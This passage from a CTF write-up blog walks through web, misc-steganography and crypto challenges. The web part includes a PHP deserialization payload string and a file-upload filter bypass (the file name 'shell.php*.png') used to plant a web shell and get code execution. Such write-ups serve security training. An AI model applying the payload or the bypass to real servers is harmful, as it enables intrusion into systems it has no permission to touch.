<span class="token variable">$t</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//a:2:&#123;i:0;s:1:"1";i:1;O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:4;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:2:"xk":0:&#123;&#125;&#125;&#125;&#125;</span></code></pre>
<p>拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNAtU.png" alt="OpNAtU.png" loading="lazy"><br>查看源码就有flag</p>
<h2 id="宇宙召唤"><a href="#宇宙召唤" class="headerlink" title="宇宙召唤"></a>宇宙召唤</h2><blockquote>
<p>来自宇宙深处的呼唤 似乎有个声音一直在你脑中重复 不要回复 不要回复 不要回复<br>又有一个距离你较近的声音重复 宇宙真理 42 42 42<br>你似乎想与它交流什么 你们的距离似乎很遥远 只能发送1024字节 不要让它失望 为什么不理解它的爱</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/OpNKjY.png" alt="OpNKjY.png" loading="lazy"><br>根据描述只能上传1024kb的文件<br>上传一个超小的马看看<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNvWv.png" alt="OpNvWv.png" loading="lazy"><br>提示文件类型不对，但是无论修改啥类型，添加什么头，截断等等都传不上去<br>根据提示42 42 42 ，42对应的ascii字符是<code>*</code>，测试发现*可以截断文件名<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNygq.png" alt="OpNygq.png" loading="lazy"><br>改为<code>shell.php*.png</code>发现成功上传并且保留的是php的后缀<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNgsc.png" alt="OpNgsc.png" loading="lazy"><br>成功rce拿到flag</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc-签到"></a>Misc-签到</h2><pre class="language-none"><code class="language-none">27880
30693
25915
21892
38450
23454
39564
23460
21457
36865
112
108
98
99
116
102
33719
21462
21069
27573
102
108
97
103
20851
27880
79
110
101
45
70
111
120
23433
20840
22242
38431
22238
22797
112
108
98
99
116
102
33719
21462
21518
27573
102
108
97
103</code></pre>
<p>给了一串数字，盲猜中文ascii码<br>写个py转化以下</p>
<pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">30693</span><span class="token punctuation">,</span> <span class="token number">25915</span><span class="token punctuation">,</span> <span class="token number">21892</span><span class="token punctuation">,</span> <span class="token number">38450</span><span class="token punctuation">,</span> <span class="token number">23454</span><span class="token punctuation">,</span> <span class="token number">39564</span><span class="token punctuation">,</span> <span class="token number">23460</span><span class="token punctuation">,</span> <span class="token number">21457</span><span class="token punctuation">,</span> <span class="token number">36865</span><span class="token punctuation">,</span> 
    <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> <span class="token number">21069</span><span class="token punctuation">,</span> <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> 
    <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">20851</span><span class="token punctuation">,</span> <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">23433</span><span class="token punctuation">,</span> <span class="token number">20840</span><span class="token punctuation">,</span> 
    <span class="token number">22242</span><span class="token punctuation">,</span> <span class="token number">38431</span><span class="token punctuation">,</span> <span class="token number">22238</span><span class="token punctuation">,</span> <span class="token number">22797</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> 
    <span class="token number">21518</span><span class="token punctuation">,</span> <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span>

chinese <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        chinese <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>chinese<span class="token punctuation">)</span>
<span class="token operator">//</span>注知攻善防实验室发送plbctf获取前段flag关注One<span class="token operator">-</span>Fox安全团队回复plbctf获取后段flag</code></pre>
<h2 id="江"><a href="#江" class="headerlink" title="江"></a>江</h2><p>百度全景地图<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNPGG.png" alt="OpNPGG.png" loading="lazy"><br><code>flag&#123;湖北省武汉市江汉二路与江汉路步行街交叉路口&#125;</code></p>
<h2 id="FM145-8"><a href="#FM145-8" class="headerlink" title="FM145.8"></a>FM145.8</h2><p>FM 一眼SSTV<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN4hI.jpg" alt="OpN4hI.jpg" loading="lazy"><br><code>flag&#123;19b4dD77bF3c66f91c23F5A25Bc314CB&#125;</code></p>
<h2 id="ez-misc"><a href="#ez-misc" class="headerlink" title="ez_misc"></a>ez_misc</h2><p>ctf.jpg末尾有snow隐写<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNH2F.png" alt="OpNH2F.png" loading="lazy"><br>拿到密码<code>Carefree and carefree</code>,先修复以下压缩包然后打开压缩包拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNEW6.png" alt="OpNEW6.png" loading="lazy"></p>
<h2 id="为什么我的新猫猫吃不饱"><a href="#为什么我的新猫猫吃不饱" class="headerlink" title="为什么我的新猫猫吃不饱"></a>为什么我的新猫猫吃不饱</h2><p><img src="https://ooo.0x0.ooo/2024/04/22/OpNGgP.png" alt="OpNGgP.png" loading="lazy"><br>010打开gif文件尾有个类似flag头的<code>UOZT&#123;NB_XZ1_</code>放到随波逐流里面梭哈<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNQVb.png" alt="OpNQVb.png" loading="lazy"><br>拿到flag头<code>flag&#123;my_ca1_</code><br>然后看png文件，发现左边缘有紫色的，大概率是盲水印了<br><img src="https://ooo.0x0.ooo/2024/04/22/OpN0ol.png" alt="OpN0ol.png" loading="lazy"><br>在gif中分解出两个与png像的图片然后检测盲水印<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNcrg.png" alt="OpNcrg.png" loading="lazy"><br>第23帧与png及其相似<br>提取一下水印<br><img src="https://ooo.0x0.ooo/2024/04/22/OpNs3s.png" alt="OpNs3s.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/22/OpNYiK.png" alt="OpNYiK.png" loading="lazy"><br>后半段,这字挺难认的<br><code>1s_Fu11&#125;</code>,最终flag<code>flag&#123;my_ca1_1s_Fu11&#125;</code><br>附带提取水印脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>
<span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> random
<span class="token keyword">import</span> os
<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParser
ALPHA <span class="token operator">=</span> <span class="token number">5</span>


<span class="token keyword">def</span> <span class="token function">build_parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--original'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'ori'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--image'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--result'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'res'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--alpha'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'alpha'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>ALPHA<span class="token punctuation">)</span>
    <span class="token keyword">return</span> parser


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> build_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ori <span class="token operator">=</span> options<span class="token punctuation">.</span>ori
    img <span class="token operator">=</span> options<span class="token punctuation">.</span>img
    res <span class="token operator">=</span> options<span class="token punctuation">.</span>res
    alpha <span class="token operator">=</span> options<span class="token punctuation">.</span>alpha
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">:</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"original image %s does not exist."</span> <span class="token operator">%</span> ori<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"image %s does not exist."</span> <span class="token operator">%</span> img<span class="token punctuation">)</span>
    decode<span class="token punctuation">(</span>ori<span class="token punctuation">,</span> img<span class="token punctuation">,</span> res<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>ori_path<span class="token punctuation">,</span> img_path<span class="token punctuation">,</span> res_path<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ori <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>ori_path<span class="token punctuation">)</span>
    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>
    ori_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>ori<span class="token punctuation">)</span>
    img_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
    height<span class="token punctuation">,</span> width <span class="token operator">=</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    watermark <span class="token operator">=</span> <span class="token punctuation">(</span>ori_f <span class="token operator">-</span> img_f<span class="token punctuation">)</span> <span class="token operator">/</span> alpha
    watermark <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>watermark<span class="token punctuation">)</span>
    res <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>watermark<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>
    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>height <span class="token operator">+</span> width<span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    y <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span>
    x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

    y <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">)</span>
    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>y<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>
            res<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> watermark<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>res_path<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="350-350"><a href="#350-350" class="headerlink" title="350*350"></a>350*350</h2><p>拿到压缩包然后解压<br><img src="https://ooo.0x0.ooo/2024/04/23/Opyppj.png" alt="Opyppj.png" loading="lazy"><br>有一个图片 和一个压缩包<br>图片是key,对图片分析<br>用foremost新分离出来一个压缩包<br><img src="https://ooo.0x0.ooo/2024/04/23/OpytKY.png" alt="OpytKY.png" loading="lazy"><br>改后缀为doc发现零宽隐写<br><img src="https://ooo.0x0.ooo/2024/04/23/Opy40v.png" alt="Opy40v.png" loading="lazy"></p>
<blockquote>
<p>井兑未济大畜咸益升归妹旅中孚剥噬嗑小过中孚震归妹升兑艮随旅随蒙颐升益蛊颐咸涣豫兑咸观艮益升中孚复睽咸观解临旅涣噬嗑屯</p>
</blockquote>
<p>64卦加密，解密一下</p>
<pre class="language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">'井兑未济大畜咸益升归妹旅中孚剥噬嗑小过中孚震归妹升兑艮随旅随蒙颐升益蛊颐咸涣豫兑咸观艮益升中孚复睽咸观解临旅涣噬嗑屯'</span>
dic<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>

cc<span class="token operator">=</span><span class="token string">""</span>
i<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">>=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cc<span class="token operator">+=</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        cc<span class="token operator">+=</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        i<span class="token operator">+=</span><span class="token number">1</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
x<span class="token operator">=</span><span class="token string">""</span>
end<span class="token operator">=</span>cc
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ins<span class="token operator">=</span>end<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>
    x<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ins<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre>
<blockquote>
<p>key:6470e394cbf6dab6a91682cc8585059b</p>
</blockquote>
<p>拿到key去解压<br>里面又套了一个伪加密<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyHMq.png" alt="OpyHMq.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpyL1c.png" alt="OpyL1c.png" loading="lazy"><br>拿到一张图片<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyEHr.png" alt="OpyEHr.png" loading="lazy"><br>还需要分离<br><img src="https://ooo.0x0.ooo/2024/04/23/OpySxG.png" alt="OpySxG.png" loading="lazy"><br>foremost又分离出来两张图片<br>提取盲水印</p>
<blockquote>
<p>pip install blind-watermark</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> cv2

<span class="token keyword">from</span> blind_watermark <span class="token keyword">import</span> WaterMark
<span class="token keyword">import</span> os

bwm1 <span class="token operator">=</span> WaterMark<span class="token punctuation">(</span>password_wm<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> password_img<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># 注意需要设定水印的长宽wm_shape</span>
bwm1<span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token string">'33.png'</span><span class="token punctuation">,</span> wm_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">)</span><span class="token punctuation">,</span> out_wm_name<span class="token operator">=</span><span class="token string">'output.png'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">)</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/04/23/Opy0J1.png" alt="Opy0J1.png" loading="lazy"><br>扫码拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/23/OpycfI.png" alt="OpycfI.png" loading="lazy"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="玛卡巴卡有什么坏心思呢"><a href="#玛卡巴卡有什么坏心思呢" class="headerlink" title="玛卡巴卡有什么坏心思呢"></a>玛卡巴卡有什么坏心思呢</h2><p>解密脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">content <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">fr'玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰'</span></span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> time
<span class="token keyword">import</span> ctypes<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span>codecs<span class="token punctuation">,</span>base64
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode
<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys



encoding_rules <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'玛卡巴卡轰'</span><span class="token punctuation">,</span>    
    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token string">'阿巴雅卡轰'</span><span class="token punctuation">,</span>
    <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token string">'伊卡阿卡噢轰'</span><span class="token punctuation">,</span>
